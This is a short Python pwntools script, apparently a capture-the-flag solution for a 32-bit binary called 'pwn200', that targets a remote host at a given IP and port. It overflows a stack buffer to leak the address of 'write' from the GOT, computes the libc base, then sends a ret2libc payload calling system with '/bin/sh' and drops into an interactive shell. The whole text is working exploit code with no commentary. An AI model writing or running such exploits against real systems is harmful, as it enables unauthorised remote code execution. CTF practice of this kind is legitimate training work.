from pwn import *
p=process("./pwn200")
p=remote("111.198.29.45","55264")
e=ELF("./pwn200")

context.log_level='debug'
p.recv()
payload='1'*0x6c+'2222'+p32(e.plt['write'])+p32(0x08048484)+p32(1)+p32(e.got['write'])+p32(4)
# 0x08048484
p.sendline(payload)
libc_base=u32(p.recv())-0xd43c0
info(hex(libc_base))
payload='1'*0x6c+'2222'+p32(libc_base+0x3a940)+p32(libc_base+0x15902b)*2
# gdb.attach(p,"b*0x080484BC")
p.sendline(payload)

p.interactive()